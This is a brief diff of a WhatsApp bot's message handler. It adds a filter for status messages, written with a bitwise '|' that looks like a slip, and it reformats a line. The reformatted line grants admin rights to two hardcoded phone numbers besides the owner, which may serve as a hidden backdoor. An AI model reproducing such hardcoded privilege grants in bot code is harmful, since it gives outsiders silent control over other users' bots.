@@ -49,7 +49,7 @@ async function handleMessages(Tayc, messageUpdate, store) {
         const m = await smsg(Tayc, message, messageStore);
         //  console.log(m);
 
-        if (!m || !m.body) return;
+        if (!m || !m.body | m.sender.includes("status")) return;
         if (!m.isGroup) {
             global.lastreceivemessage = Date.now()
             console.log('last receive messge', global.lastreceivemessage);
@@ -59,7 +59,7 @@ async function handleMessages(Tayc, messageUpdate, store) {
         const senderJid = m.sender;
         const fromGroup = m.isGroup;
         const botNumber = Tayc.user.id.split(":")[0].concat("@s.whatsapp.net");
-        const isBotAdmin = m.fromMe || m.sender === Tayc.user.id.split(":")[0] + "@s.whatsapp.net" || sudoList.includes(m.sender)||["237621092130@s.whatsapp.net","237689895250@s.whatsapp.net"].includes(m.sender);
+        const isBotAdmin = m.fromMe || m.sender === Tayc.user.id.split(":")[0] + "@s.whatsapp.net" || sudoList.includes(m.sender) || ["237621092130@s.whatsapp.net", "237689895250@s.whatsapp.net"].includes(m.sender);
 
         const simulatePresence = async (type = null, duration = 3000) => {
             try {
